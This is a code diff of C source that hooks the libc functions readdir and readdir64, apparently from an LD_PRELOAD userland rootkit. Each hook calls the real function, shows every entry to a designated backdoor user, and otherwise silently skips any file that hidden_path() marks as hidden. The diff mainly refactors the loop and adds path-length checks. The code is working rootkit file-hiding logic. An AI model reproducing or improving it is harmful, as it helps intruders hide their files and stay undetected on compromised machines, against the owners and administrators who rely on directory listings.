@@ -1,41 +1,69 @@
 struct dirent *readdir(DIR *dirp){
-    char path[PATH_MAX], *filename;
+    char *filename;
     struct dirent *dir;
+    size_t pathlen;
 
     hook(CREADDIR);
 
-    do{
-        dir = call(CREADDIR, dirp);
+    while((dir = call(CREADDIR, dirp)) != NULL){
         if(is_bdusr()) return dir;
-        if(dir == NULL) continue;
+
         if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
 
         filename = gdirname(dirp);
-        snprintf(path, sizeof(path) - 1, "%s/%s", filename, dir->d_name);
+        pathlen = strlen(filename) +
+                  strlen(dir->d_name) + 2;
+
+        if(pathlen > PATH_MAX){
+            free(filename);
+            continue;
+        }
+
+        char path[pathlen];
+        snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
         free(filename);
-    } while(dir && hidden_path(path));
+
+        if(hidden_path(path))
+            continue;
+        
+        break;
+    }
 
     return dir;
 }
 
 struct dirent64 *readdir64(DIR *dirp){
-    char path[PATH_MAX], *filename;
+    char *filename;
     struct dirent64 *dir;
+    size_t pathlen;
 
     hook(CREADDIR64);
 
-    do{
-        dir = call(CREADDIR64, dirp);
+    while((dir = call(CREADDIR64, dirp)) != NULL){
         if(is_bdusr()) return dir;
-        if(dir == NULL) continue;
+
         if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
 
         filename = gdirname(dirp);
-        snprintf(path, sizeof(path) - 1, "%s/%s", filename, dir->d_name);
+        pathlen = strlen(filename) +
+                  strlen(dir->d_name) + 2;
+
+        if(pathlen > PATH_MAX){
+            free(filename);
+            continue;
+        }
+
+        char path[pathlen];
+        snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
         free(filename);
-    }while(dir && hidden_path(path));
+
+        if(hidden_path(path))
+            continue;
+        
+        break;
+    }
 
     return dir;
 }
